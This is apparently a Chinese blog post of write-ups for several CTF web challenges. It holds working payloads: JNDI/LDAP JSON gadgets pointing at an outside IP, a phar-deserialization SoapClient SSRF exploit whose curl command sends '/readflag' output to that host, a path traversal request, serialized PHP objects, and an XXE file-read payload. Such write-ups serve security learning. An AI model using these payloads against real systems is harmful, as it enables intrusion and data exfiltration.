## 0x01 [红明谷CTF 2021]JavaWeb

`/;/json`绕过权限校验,然后漏洞探测

```
["java.net.InetAddress","khl16k.dnslog.cn"]
```

![image-20220124084950989](https://img.dem0dem0.top/images/image-20220124084950989.png)

```
["br.com.anteros.dbcp.AnterosDBCPConfig", {"healthCheckRegistry": "ldap://8.142.93.103:9090/test"}]
```

```
["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://8.142.93.103:9090/test"}]
```

## 0x02 [b01lers2020]Scrambled

```
lag052c5816c-3f6b-47eb-b7f7-692e5803b6040000000000
    05f6b54c-784c-4e74-a29c-e63c2b078a81
```

直接上wp

```python
import requests
import re


url = 'http://6e085bd1-c88b-46ce-adbd-12d3139e997d.node4.buuoj.cn:81/'
headers = {'Cookie': 'frequency=1; transmissions=kxkxkxkxsha410kxkxkxkxsh'}

flag = [0] * 50

while True:
    res = requests.session()
    cookie = res.get(url, headers=headers).headers['Set-Cookie']
    try:
        tmp = re.search(r'kxkxkxkxsh(.+)kxkxkxkxsh;', cookie).group()[10:-11]
        
        flag[int(tmp[2:])] = tmp[1:2]
        flag[int(tmp[2:])-1] = tmp[0:1]
        
        for i in flag:
            print(i, end='')
        print()
    except:
        pass

```

## 0x03 [极客大挑战 2020]Roamphp4-Rceme

直接抄SCTF2022的rceme。无字母 无参数rce

## 0x04 [Windows][HITCON 2019]Buggy_Net

```aspx
<% 

    bool isBad = false;
    try {
        if ( Request.Form["filename"] != null ) {
            isBad = Request.Form["filename"].Contains("..") == true;
        }
    } catch (Exception ex) {
        
    } 

    try {
        if (!isBad) {
            Response.Write(System.IO.File.ReadAllText(@"C:\inetpub\wwwroot\" + Request.Form["filename"]));
        }
    } catch (Exception ex) {

    }
%>
```

这个题目的意思是在第一个`try`里面把那个引发异常跳过对于`isbad`的赋值，然后这样我们就可以在第二个异常捕获中任意读取。https://www.slideshare.net/SoroushDalili/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour

aspx自作主张地在程序中加入了对于xss的捕获，这样我们传入xss字符就引发异常跳过第一个捕获，并且还可以通过编码异常来绕过。

```
GET / HTTP/1.1
Host: node3.buuoj.cn:29225
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://node3.buuoj.cn:29225
Connection: close
Cookie: _ga=GA1.2.1327658694.1580490668
Upgrade-Insecure-Requests: 1

filename=../../FLAG.txt&qwqeqwe=<!

```

大家还可以研究一下的是，在这里有一个字段特别重要，就先不说了，大家自己zhao。(Content-Type: application/x-www-form-urlencoded)

## 0x05 [SUCTF 2019]Upload Labs 2

这个题目原来是给了源码的，但是我在buu进行复现的时候发现，没有给源码，我先进行了黑盒的测试，发现了一处我以为是`ssrf`，但其实不是的地方，后来我以为后台的实现是`file_get_contents`，有trick可以发post请求，但其实admin.php的问题，打出非预期解的情况。下面说一下。

- 解法1

  看到源码之后不难发现，查看的函数非常特殊，是

  ```php
  $finfo = finfo_open(FILEINFO_MIME_TYPE);
  $this->type = finfo_file($finfo, $this->file_name);
  finfo_close($finfo);
  ```

  然后猜测是phar反序列化，为什么没有继续研究这个函数就可以知道了，这是来自于一个ctf赛狗的直觉。然后剩下的其实就没有什么难度，

  ![image-20220126180820632](https://img.dem0dem0.top/images/image-20220126180820632.png)

可以触发__call方法，我们要做的就是顺着这个思路继续做下去，ssrf就可以了。

```php
<?php
$phar = new Phar('333.phar');
$phar->startBuffering();
$phar->addFromString('333.txt','text');
$phar->setStub('<script language="php">__HALT_COMPILER();</script>');

class File {
    public $file_name = "";
    public $func = "SoapClient";

    function __construct(){
        $target = "http://127.0.0.1/admin.php";
        $post_string = 'admin=1&cmd=curl "http://8.142.93.103"."?`/readflag`"&clazz=SplStack&func1=push&func2=push&func3=push&arg1=123456&arg2=123456&arg3='. "\r\n";
        $headers = [];
        $this->file_name  = [
            null,
            array('location' => $target,
                  'user_agent'=> str_replace('^^', "\r\n", 'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string),
                  'uri'=>'hello')
        ];
    }
}
$object = new File;
echo urlencode(serialize($object));
$phar->setMetadata($object);
$phar->stopBuffering();
```

- 解法2

  ![image-20220126180926609](https://img.dem0dem0.top/images/image-20220126180926609.png)

利用这里我们可以伪造一个mysql请求，利用rogue-mysql攻击来。但其实我没有理解这个有什么用...

出题笔记:https://xz.aliyun.com/t/6057

## 0x06 [SWPU2019]Web6

猜谜语，大家和我一起猜谜语，猜中的话就给你一个flag，猜不中就给我爬开点。

开篇是个rollup注入，学习了。

```
POST /index.php HTTP/1.1
Host: 09965a05-6a41-44d6-8afa-cdb616073670.node4.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Referer: http://e9c1f3a3-c85f-4699-95d1-e09749f5226c.node3.buuoj.cn/index.php?method=user
Cookie: PHPSESSID=ccc;
Content-Type: multipart/form-data; boundary=--------1995995913
Content-Length: 442
Connection: close
Accept-Encoding: gzip,deflate

----------1995995913
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

|O:10:"SoapClient":4:{s:3:"uri";s:4:"aaab";s:8:"location";s:30:"http://127.0.0.1/interface.php";s:11:"_user_agent";s:60:"wupco
X-Forwarded-For: 127.0.0.1
Cookie: user=xZmdm9NxaQ==";s:13:"_soap_version";i:1;}
----------1995995913
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain


----------1995995913--

```

```
POST /se.php HTTP/1.1
Host: 09965a05-6a41-44d6-8afa-cdb616073670.node4.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Cookie: PHPSESSID=ccc;
Content-Type: application/x-www-form-urlencoded
Content-Length: 278
Connection: close

aa=O:2:"bb":2:{s:4:"mod1";O:2:"aa":2:{s:4:"mod1";N;s:4:"mod2";a:1:{s:5:"test2";O:2:"cc":3:{s:4:"mod1";O:2:"ee":2:{s:4:"str1";O:2:"dd":3:{s:4:"name";N;s:4:"flag";s:8:"Get_flag";s:1:"b";s:14:"call_user_func";}s:4:"str2";s:7:"getflag";}s:4:"mod2";N;s:4:"mod3";N;}}}s:4:"mod2";N;}

```

然后就是两个链子，和一个奇怪的逆向混入。

## 0x07 [GKCTF 2021]babycat-revenge

```
printwriter xmldecoder 反序列化`就有`https://www.cnblogs.com/peterpan0707007/p/10565968.html
```

前面的都做过，就不用多说了....

## 0x08 [RoarCTF 2019]PHPShe

抄wp都没通，无语

## 0x09 [FireshellCTF2020]Cars

![image-20220127111502435](https://img.dem0dem0.top/images/image-20220127111502435.png)

输入可控的位置，我们post数据上去，发现直接传输键值对，返回bad_data,于是我们猜想是不是该用json，发现成功，json可以的话xml也可以，发现不仅可以而且有回显，成功打出。

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "file:///flag" >]>  
 <test>     
<name>&xxe;</name>
<message>
123
</message>
</test>
```

## 0x0A [Windows]LFI2019

参考链接: https://xz.aliyun.com/t/6655

这个题目**FindFirstFile**，主要利用的是这个winapi。然后我对里面进行深入的分析，发现了以下几个比较好玩的trick。其会把`"`解释为`.`。意即：`shell"php` === `shell.php`。`>`被替换成`?`，字符`<`被替换成`*`，而符号”（双引号）被替换成一个`.`字符

这里我们在包含文件的时候就可以这样传递：`"/test`这个就会被解析成为`./test`是没有问题的
